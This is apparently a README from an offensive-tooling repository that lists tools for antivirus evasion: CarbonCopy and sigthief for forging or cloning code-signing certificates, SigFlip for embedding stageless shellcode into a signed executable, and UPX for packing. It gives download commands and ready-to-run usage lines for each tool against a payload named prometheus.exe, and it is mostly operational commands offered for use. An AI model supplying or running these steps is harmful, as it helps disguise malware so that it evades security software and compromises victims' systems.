## CarbonCopy.py

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|CarbonCopy|A tool which creates a spoofed certificate of any online website<br />and signs an Executable for AV Evasion. Works for both Windows and Linux|User Land|To be executed under Linux|

**download Script:**
```shell
wget https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/CarbonCopy.py -O CarbonCopy.py
```

**prerequisites:**
```shell 
apt-get install osslsigncode
pip3 install pyopenssl
```

**execute:**
```python   
python3 CarbonCopy.py www.microsoft.com 443 prometheus.exe signed-prometheus.exe
```

<br />

## sigthief.py

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|sigthief|A tool to sign an Executable for AV Evasion.<br />It clones signcheck.exe to sign the new binary|User Land|Dependencies: python3|

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/sigthief.py" -OutFile "sigthief.py"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/signcheck.exe" -OutFile "signcheck.exe"
```

**execute:**
```python   
python Sigthief.py -i "sigcheck.exe" -t "prometheus.exe" -o "signed-prometheus.exe"
```

<br />

## SigFlip.exe

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|SigFlip|A tool to sign an Executable for AV Evasion.|User Land|[Author: @med0x2e](https://github.com/med0x2e/SigFlip)|

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/SigFlip.exe" -OutFile "SigFlip.exe"
```

**execute:**
```powershell 
#Help
.\SigFlip.exe -h

#Sign original PE
.\SigFlip.exe -b "original.exe" "Signed-original.exe"

#build Signed Shellcode Executable { embebbed shellcode.bin on Signed-original.exe }
.\SigFlip.exe -i "original.exe" "x64-stageless.bin" "Signed-original.exe"
```





<br />

## upx.exe

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|upx|compress or expand executable filess|User Land|[Author: Markus Oberhumer, Laszlo Molnar & John Reiser](https://upx.github.io)|

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/upx.exe" -OutFile "upx.exe"
```

**execute:**
```powershell 
# Pack original PE
.\upx.exe --best "program.exe"
```

